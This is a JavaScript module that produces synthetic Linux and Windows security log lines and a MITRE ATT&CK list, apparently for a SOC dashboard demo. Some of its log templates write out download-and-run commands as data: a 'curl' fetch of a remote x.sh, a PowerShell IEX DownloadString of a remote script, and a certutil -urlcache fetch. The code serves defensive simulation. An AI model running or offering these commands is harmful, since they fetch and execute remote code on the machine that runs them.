// Realistic-looking (but synthetic) Linux & Windows security log lines for the SOC monitors.
// IPs come from public documentation ranges + common scanner-style prefixes; nothing here is real telemetry.

const pick = (a) => a[Math.floor(Math.random() * a.length)];
const int = (a, b) => a + Math.floor(Math.random() * (b - a + 1));
const ip = () => pick([`185.220.${int(100, 102)}.${int(2, 250)}`, `45.${int(10, 160)}.${int(0, 255)}.${int(2, 250)}`, `203.0.113.${int(2, 250)}`, `198.51.100.${int(2, 250)}`, `91.${int(100, 240)}.${int(0, 255)}.${int(2, 250)}`]);
const lan = () => `10.0.${int(0, 9)}.${int(2, 250)}`;
const users = ['root', 'admin', 'ubuntu', 'oracle', 'test', 'postgres', 'git', 'deploy'];
const people = ['k.karuppasamy', 'j.smith', 'a.patel', 'm.chen', 'svc_backup', 'r.jones'];
const pad = (n, w = 2) => String(n).padStart(w, '0');

function syslogTime() {
  const d = new Date();
  const mon = d.toLocaleString('en-GB', { month: 'short' });
  return `${mon} ${String(d.getDate()).padStart(2, ' ')} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

/* ── Linux: auth.log / syslog / kern / auditd / fail2ban ── */
export function linuxLine(host) {
  const pid = int(1000, 48000);
  const t = syslogTime();
  const r = Math.random();
  if (r < 0.26) return { lvl: 'warn', text: `${t} ${host} sshd[${pid}]: Failed password for invalid user ${pick(users)} from ${ip()} port ${int(30000, 65000)} ssh2` };
  if (r < 0.36) return { lvl: 'ok', text: `${t} ${host} sshd[${pid}]: Accepted publickey for ${pick(people)} from ${lan()} port ${int(40000, 60000)} ssh2: ED25519 SHA256:${Math.random().toString(36).slice(2, 10)}` };
  if (r < 0.46) return { lvl: 'block', text: `${t} ${host} kernel: [UFW BLOCK] IN=eth0 OUT= SRC=${ip()} DST=${lan()} PROTO=TCP SPT=${int(30000, 65000)} DPT=${pick([22, 23, 445, 3389, 5900, 8080])} SYN` };
  if (r < 0.54) return { lvl: 'alert', text: `${t} ${host} fail2ban.actions[${pid}]: NOTICE [sshd] Ban ${ip()}` };
  if (r < 0.62) return { lvl: 'info', text: `${t} ${host} sudo: ${pick(people)} : TTY=pts/${int(0, 4)} ; PWD=/home ; USER=root ; COMMAND=/usr/bin/systemctl restart ${pick(['nginx', 'suricata', 'auditd', 'filebeat'])}` };
  if (r < 0.7) return { lvl: 'info', text: `${t} ${host} CRON[${pid}]: (root) CMD (/usr/local/bin/rotate-logs.sh >/dev/null 2>&1)` };
  if (r < 0.8)
    return {
      lvl: 'alert',
      text: `type=EXECVE msg=audit(${(Date.now() / 1000).toFixed(3)}:${int(1000, 9999)}): argc=3 a0="curl" a1="-s" a2="http://${ip()}/x.sh" key="susp_download"`,
    };
  if (r < 0.88) return { lvl: 'warn', text: `${t} ${host} suricata[${pid}]: [1:${int(2000000, 2030000)}:3] ET SCAN Nmap Scripting Engine User-Agent {TCP} ${ip()} -> ${lan()}:80` };
  if (r < 0.94) return { lvl: 'info', text: `${t} ${host} systemd[1]: Started ${pick(['Session 41 of user deploy', 'Daily apt upgrade', 'Filebeat shipper', 'osquery daemon'])}.` };
  return { lvl: 'ok', text: `${t} ${host} wazuh-agent[${pid}]: rule 5712 (sshd brute force) → active response: firewall-drop` };
}

/* ── Windows: Security / Sysmon / PowerShell / System ── */
const WIN = [
  { id: 4625, ch: 'Security', lvl: 'warn', msg: () => `An account failed to log on. Account: ${pick(users)}  Logon Type: 3  Source: ${ip()}  Status: 0xC000006D` },
  { id: 4624, ch: 'Security', lvl: 'ok', msg: () => `An account was successfully logged on. Account: ${pick(people)}  Logon Type: ${pick([2, 3, 10])}` },
  { id: 4688, ch: 'Security', lvl: 'info', msg: () => `A new process has been created. ${pick(['powershell.exe', 'cmd.exe', 'rundll32.exe', 'wmic.exe'])} Parent: ${pick(['explorer.exe', 'winword.exe', 'services.exe'])}` },
  { id: 4720, ch: 'Security', lvl: 'alert', msg: () => `A user account was created. New account: ${pick(['helpdesk2', 'svc_update', 'backup$'])}  By: ${pick(people)}` },
  { id: 4672, ch: 'Security', lvl: 'info', msg: () => `Special privileges assigned to new logon. Account: ${pick(people)}  SeDebugPrivilege` },
  { id: 4104, ch: 'PowerShell', lvl: 'alert', msg: () => `Script block logged: IEX (New-Object Net.WebClient).DownloadString('http://${ip()}/a.ps1')` },
  { id: 1, ch: 'Sysmon', lvl: 'info', msg: () => `Process Create: ${pick(['C:\\Windows\\System32\\certutil.exe -urlcache -f', 'C:\\Users\\Public\\upd.exe', 'C:\\Windows\\System32\\whoami.exe /all'])}` },
  { id: 3, ch: 'Sysmon', lvl: 'warn', msg: () => `Network connection: ${pick(['rundll32.exe', 'powershell.exe', 'mshta.exe'])} → ${ip()}:${pick([443, 8443, 4444, 53])}` },
  { id: 11, ch: 'Sysmon', lvl: 'info', msg: () => `File created: C:\\Users\\${pick(people)}\\AppData\\Local\\Temp\\${Math.random().toString(36).slice(2, 8)}.tmp` },
  { id: 7045, ch: 'System', lvl: 'alert', msg: () => `A service was installed. Service Name: ${pick(['WinUpdSvc', 'PSEXESVC', 'AdobeHelper'])}  Start Type: auto` },
  { id: 1102, ch: 'Security', lvl: 'alert', msg: () => `The audit log was cleared. Subject: ${pick(people)}` },
];
export function windowsLine(domain) {
  const e = pick(WIN);
  const d = new Date();
  return { id: e.id, ch: e.ch, lvl: e.lvl, time: `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`, host: `${domain}\\WS-${int(100, 240)}`, msg: e.msg() };
}

export const MITRE = [
  ['T1110', 'Brute Force'],
  ['T1059.001', 'PowerShell'],
  ['T1046', 'Network Scan'],
  ['T1105', 'Ingress Tool Transfer'],
  ['T1136', 'Create Account'],
  ['T1543.003', 'Windows Service'],
  ['T1070.001', 'Clear Event Logs'],
];
